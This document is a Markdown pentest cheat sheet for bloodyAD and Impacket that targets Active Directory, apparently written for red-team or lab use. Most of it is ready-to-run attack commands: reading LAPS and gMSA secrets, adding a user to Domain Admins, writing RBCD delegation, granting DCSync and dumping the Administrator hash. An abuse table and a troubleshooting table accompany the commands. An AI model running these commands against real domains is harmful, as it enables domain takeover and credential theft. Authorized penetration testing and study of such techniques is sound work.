# bloodyAD (senior)

Directory read/write without a GUI. Faster than raw ldapmodify, less guessy than nxc for ACEs.

## When / not

Use for: `get writable`, LAPS, gMSA blob, add/remove group member, set password, shadow creds, uac flags, dnshostname, rbcd.
Do not use for: roasting (nxc/Impacket), ESC request (Certipy), dumping NTDS (secretsdump).

## Flags that matter

```
bloodyAD --host {{DC}} -d {{DOMAIN}} -u {{USER}} -p '{{PASS}}' get writable
bloodyAD --host {{DC}} -d {{DOMAIN}} -u {{USER}} -p '{{PASS}}' get object Users --attr member
bloodyAD --host {{DC}} -d {{DOMAIN}} -u {{USER}} -p '{{PASS}}' get search \
  --filter '(ms-Mcs-AdmPwd=*)' --attr dNSHostName,ms-Mcs-AdmPwd
bloodyAD --host {{DC}} -d {{DOMAIN}} -u {{USER}} -p '{{PASS}}' get object 'GMSA$' \
  --attr msDS-ManagedPassword

# writes — lab / RoE only
bloodyAD --host {{DC}} -d {{DOMAIN}} -u {{USER}} -p '{{PASS}}' add groupMember 'Domain Admins' {{USER}}
bloodyAD --host {{DC}} -d {{DOMAIN}} -u {{USER}} -p '{{PASS}}' set password TARGET 'LabOnly!1'
bloodyAD --host {{DC}} -d {{DOMAIN}} -u {{USER}} -p '{{PASS}}' add genericAll TARGET {{USER}}
bloodyAD --host {{DC}} -d {{DOMAIN}} -u {{USER}} -p '{{PASS}}' add rbcd TARGET FAKE\$
```

Kerberos: `-k` if you have a ccache. LDAPS: `--host` + scheme if signing/channel-binding bites.

## Empty password (guest) — tool limitation

Stock `bloodyAD` **refuses `-p ''`** ("You should provide a -p 'password'").
guest with an empty password is still a valid foothold — route around it:

```
# read/enumerate as guest → use Impacket / nxc instead
impacket-GetUserSPNs {{DOMAIN}}/guest -no-pass -dc-ip {{DC}} -request

# GenericWrite RBCD write as guest — NTLM -no-pass is REJECTED
# ("NTLM needs domain\username and a password"). Go through Kerberos:
impacket-getTGT -no-pass {{DOMAIN}}/guest -dc-ip {{DC}}      # -> guest.ccache
export KRB5CCNAME=$PWD/guest.ccache
impacket-rbcd -delegate-to 'AD$' -delegate-from {{SPN_USER}} -action write \
  -k -no-pass {{DOMAIN}}/guest -dc-ip {{DC}}
# note: computer accounts end in $ -> quote it ('AD$'), or the DN lookup fails
# after you crack a real cred / get a ccache, bloodyAD works normally (or -k)
```

## RBCD from GenericWrite (existing-SPN principal)

If BloodHound shows GenericWrite on a **computer** (e.g. the DC's `AD$`) and you
control a user that **already has an SPN** (Kerberoastable), that user is a valid
RBCD principal — no `FAKE$` / MAQ needed:

```
bloodyAD --host {{DC}} -d {{DOMAIN}} -u {{USER}} -p '{{PASS}}' add rbcd 'AD$' {{SPN_USER}}
# then getST as {{SPN_USER}} — see tickets.md / impacket.md (ldap/ for DCSync)
```

## Grant DCSync (after an Administrator ccache)

```
# with KRB5CCNAME set to an Administrator S4U ticket:
bloodyAD --host {{DC_FQDN}} --dc-ip {{DC}} -d {{DOMAIN}} -k add dcsync {{USER}}
# then: impacket-secretsdump {{DOMAIN}}/{{USER}}:'{{PASS}}'@{{DC}} -just-dc-user Administrator
```

**bloodyAD not on the box?** `impacket-dacledit` is the co-equal fallback — but
three things bite (all seen live):

```
export KRB5CCNAME=$PWD/Administrator@ldap_{{DC_FQDN}}@{{DOMAIN}}.ccache
export KRB5_CONFIG=/tmp/krb5.conf     # a minimal realm->kdc map avoids resolver surprises
impacket-dacledit -action write -rights DCSync -principal {{USER}} \
  -target-dn 'DC=...' -k -no-pass -dc-host {{DC_FQDN}} {{DOMAIN}}/Administrator
```

- `-rights` is **case-sensitive**: `DCSync`, not `DCSYNC` (argparse rejects it).
- Use **`-dc-host {{DC_FQDN}}`**, not `-dc-ip`. With `-dc-ip`, Impacket hunts for a
  `ldap/<IP>` ticket, finds none (yours is `ldap/{{DC_FQDN}}`), and falls back to
  a passwordless TGT → `KDC_ERR_PREAUTH_FAILED`. The `-dc-host` must match the S4U SPN.
- Confirm the ccache first if unsure: principal `Administrator@{{DOMAIN}}`, server `ldap/{{DC_FQDN}}`.

`dacledit.py` is the Impacket twin when bloodyAD is missing:

```
dacledit.py -action write -rights DCSync -principal {{USER}} \
  -target-dn 'DC=…' {{DOMAIN}}/{{USER}}:'{{PASS}}'
```

## Read this

`get writable` is the money. Classify each line:

| Right | Abuse |
| --- | --- |
| ForceChangePassword | `changepasswd` / `set password` (lab). Then login as them |
| GenericWrite on user | shadow creds (`certipy shadow`) or targeted SPN |
| GenericWrite on computer | RBCD → getST Administrator |
| GenericAll on user/group | reset, or `add groupMember` |
| GenericAll on computer | RBCD or shadow |
| WriteDACL | grant yourself GenericAll, then DCSync |
| WriteOwner | take owner, then WriteDACL |
| AddMember / AddSelf | join the group, re-collect BH |
| ReadLAPS / ms-Mcs-AdmPwd | local admin on that host |
| msDS-ManagedPassword | gMSA NT hash → PTH |

## Fail → next

| Symptom | Next |
| --- | --- |
| empty writable | sessions / GPO / ADCS / delegation. The graph is bigger than ACLs |
| insufficient access | you misread BH — confirm the security principal (group vs user) |
| LDAPS required | `--secure` / `ldaps://` |
| `provide a -p 'password'` (empty pw) | guest path — use Impacket `-no-pass` / `rbcd`, or crack a cred first |
| rbcd `NTLM needs domain\username and a password` | empty-pw guest can't NTLM — `getTGT -no-pass` then `rbcd -k -no-pass` |
| rbcd/write `User not found in LDAP` on a computer | quote the `$`: `'AD$'` not `AD` |
| GenericWrite on computer, no MAQ | RBCD principal can be an existing SPN user, not only `FAKE$` |
| constraint violation on password | policy. Try a longer lab password |
| AddMember to DA denied | you have AddMember on a **nested** group. add there, not DA |

## Chain

BloodHound outbound → this card to confirm → one write → nxc as the new principal → re-collect.
Do not reset a DA on a customer forest. Lab only, and prefer shadow creds over password reset when both exist.
